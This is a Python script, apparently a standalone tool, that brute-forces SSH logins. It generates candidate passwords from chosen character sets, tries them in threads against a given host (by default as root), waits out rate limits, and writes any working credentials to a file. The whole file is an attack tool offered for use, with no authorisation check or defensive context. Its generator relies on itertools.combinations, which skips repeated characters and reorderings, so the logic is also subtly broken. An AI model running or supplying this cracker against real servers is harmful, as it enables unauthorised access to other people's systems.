import string
import itertools
import sys
import paramiko
import socket
import time
from colorama import init, Fore
import argparse
from concurrent.futures import ThreadPoolExecutor


init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

class PasswordGenerator:
    def __init__(self, n, *args):

        self.alphanumeric = []
        self.alphanumeric += string.ascii_uppercase if '-u' in args else []
        self.alphanumeric += string.ascii_lowercase if '-l' in args else []
        self.alphanumeric += string.digits if '-d' in args else []
        self.alphanumeric += string.punctuation if '-p' in args else []

        self.password_list = itertools.combinations(self.alphanumeric, n)

    def password_yield(self):
        for password in self.password_list:
            yield "".join(password)

class HackingTool:

    def __init__(self, hostneme, username, max_len, *args):
        self.hostname = hostneme
        self.username = username
        self.max_len = max_len + 1
        self.password = ""
        self.arg_list = args

    def password_cracker(self):
        with ThreadPoolExecutor(max_workers=n_threads) as executor:
            for n in range(1, self.max_len):
                password_generator = PasswordGenerator(n, *self.arg_list).password_yield()
                list(executor.map(self.is_ssh_open, password_generator))

    def is_ssh_open(self, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=self.hostname, username=self.username, password=password, timeout=3)
        except socket.timeout:
            # this is when host is unreachable
            print(f"{RED}[!] Host: {self.hostname} is unreachable, timed out.{RESET}")
            return False
        except paramiko.AuthenticationException:
            print(f"[!] Invalid credentials for {self.username}:{password}")
            return False
        except paramiko.SSHException:
            print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
            # sleep for a minute
            time.sleep(60)
            return self.is_ssh_open(password)
        else:
            # connection was established successfully
            self.password = password
            print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {self.hostname}\n\tUSERNAME: {self.username}\n\tPASSWORD: {password}{RESET}")
            open("password.txt", "w").write(f"{self.username}@{self.hostname}:{self.password}")
            sys.exit(2)
            return True



if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="SSH Servers Dynamic Bruteforce Password Cracker in Python")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("--user", help="Username for host, default = root")
    parser.add_argument("--max", type=int, help="Maximal len of password default = 14")
    parser.add_argument("-t", "--threads", type=int, help="Number of threads, default = 1")
    parser.add_argument("-l", "--lowercase", help="Password generator will include lowercase", action="store_true")
    parser.add_argument("-u", "--uppercase", help="Password generator will include uppercase", action="store_true")
    parser.add_argument("-d", "--digits", help="Password generator will include digits", action="store_true")
    parser.add_argument("-p", "--punctuation", help="Password generator will include punctuation", action="store_true")

    args = parser.parse_args()
    host = args.host

    username = args.user if args.user else 'root'
    max_len = args.max if args.max else 14
    n_threads = args.threads if args.threads else 1

    argument_list = []
    argument_list += ["-l"] if args.lowercase else []
    argument_list += ["-u"] if args.uppercase else []
    argument_list += ["-d"] if args.digits else []
    argument_list += ["-p"] if args.punctuation else []

    #to get traceback, deactivate line below
    sys.tracebacklimit = 0

    hack = HackingTool(host, username, max_len, *argument_list)

    hack.password_cracker()
